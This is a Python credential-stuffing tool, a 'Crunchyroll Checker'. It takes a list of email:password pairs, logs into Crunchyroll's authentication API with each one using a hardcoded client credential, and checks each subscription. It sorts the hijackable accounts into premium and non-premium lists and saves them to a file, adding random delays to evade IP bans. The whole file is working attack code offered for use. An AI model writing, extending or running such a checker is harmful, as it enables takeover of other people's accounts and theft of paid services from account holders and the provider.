import os
import requests
import uuid
import time
import random
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# ⚡ D-TECH Banner
def banner():
    print("\033[1;36m" + """
╔══════════════════════════════════════╗
║          🔥 D-TECH Crunchyroll Checker 🔥       ║
║              Made by Preasx24               ║
╚══════════════════════════════════════╝
""" + "\033[0m")

# ⚙️ Generate a unique device ID
def generate_guid():
    return str(uuid.uuid4())

# 🌐 Create session with retries
def create_session_with_retries():
    session = requests.Session()
    retries = Retry(
        total=5,
        backoff_factor=0.5,
        status_forcelist=[500, 502, 503, 504],
        raise_on_status=False
    )
    adapter = HTTPAdapter(max_retries=retries)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session

# ✅ Check Account
def check_account(session, username, password):
    device_id = generate_guid()

    token_url = "https://www.crunchyroll.com/auth/v1/token"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Authorization": "Basic eHd4cXhxcmtueWZtZjZ0bHB1dGg6a1ZlQnVUa2JOTGpCbGRMdzhKQk5DTTRSZmlTR3VWa1I=",
    }
    payload = {
        "username": username,
        "password": password,
        "grant_type": "password",
        "scope": "offline_access",
        "device_id": device_id,
        "device_name": "SM-G988N",
        "device_type": "samsung SM-G965N"
    }

    try:
        response = session.post(token_url, data=payload, headers=headers)
        response.raise_for_status()

        if "access_token" not in response.json():
            print(f"\033[1;31m[INVALID] {username}: Incorrect credentials.\033[0m")
            return "non_premium"

        access_token = response.json().get("access_token")
    except requests.exceptions.HTTPError as e:
        print(f"\033[1;33m[NON-PREMIUM] {username}\033[0m")
        return "non_premium"

    account_info_url = "https://www.crunchyroll.com/accounts/v1/me"
    headers["Authorization"] = f"Bearer {access_token}"

    try:
        response = session.get(account_info_url, headers=headers)
        response.raise_for_status()
        external_id = response.json().get("external_id")
        if not external_id:
            print(f"\033[1;33m[NON-PREMIUM] {username}\033[0m")
            return "non_premium"
    except requests.exceptions.RequestException as e:
        print(f"\033[1;33m[NON-PREMIUM] {username}\033[0m")
        return "non_premium"

    subscription_url = f"https://www.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits"
    try:
        response = session.get(subscription_url, headers=headers)
        response.raise_for_status()

        subscription_data = response.json()
        plan = subscription_data.get("benefit", "Unknown")

        if plan == "Unknown":
            print(f"\033[1;32m[PREMIUM] {username}: Premium Account\033[0m")
            return "premium"
        else:
            print(f"\033[1;33m[NON-PREMIUM] {username}: Plan - {plan}\033[0m")
            return "non_premium"
    except requests.exceptions.RequestException as e:
        print(f"\033[1;33m[NON-PREMIUM] {username}\033[0m")
        return "non_premium"


# 🚀 Main Function
def main():
    # Clear Terminal
    os.system('cls' if os.name == 'nt' else 'clear')

    # Display Banner
    banner()

    session = create_session_with_retries()

    # 📥 Input File Path for Accounts to Test
    accounts_file_path = input("\033[1;34mEnter the path to the file containing accounts (email:password format): \033[0m").strip()
    
    # Check if file exists
    if not os.path.isfile(accounts_file_path):
        print("\033[1;31mFile not found. Exiting...\033[0m")
        return

    # 📥 Input File Path for Output
    output_file_path = input("\033[1;34mEnter the path where results will be saved: \033[0m").strip()

    # Read Accounts from File
    with open(accounts_file_path, "r") as file:
        accounts = [line.strip() for line in file.readlines()]

    if not accounts:
        print("\033[1;31mNo accounts found in the file. Exiting...\033[0m")
        return

    print("\033[1;34m\n🔄 Starting account checks...\033[0m\n")
    premium_accounts = []
    non_premium_accounts = []

    for index, account in enumerate(accounts, start=1):
        username, password = account.split(':')
        print(f"\033[1;35m[CHECKING {index}/{len(accounts)}] {username}\033[0m")
        result = check_account(session, username, password)
        
        if result == "premium":
            premium_accounts.append(f"{username}:{password}")
        elif result == "non_premium":
            non_premium_accounts.append(f"{username}:{password}")
        
        # Adding a random delay to avoid IP bans
        time.sleep(random.uniform(1, 3))
    
    # Write Results to Output File
    with open(output_file_path, "w") as file:
        file.write("\033[1;32m🔥 Premium Accounts:\033[0m\n")
        for acc in premium_accounts:
            file.write(f"  - {acc}\n")
        
        file.write("\n\033[1;33m⚠️ Non-Premium Accounts:\033[0m\n")
        for acc in non_premium_accounts:
            file.write(f"  - {acc}\n")

    print("\n\033[1;32m✅ Process Complete! Results saved to the file.\033[0m")
    print(f"\033[1;34mCheck the output file: {output_file_path}\033[0m")


# 🟢 Entry Point
if __name__ == "__main__":
    main()
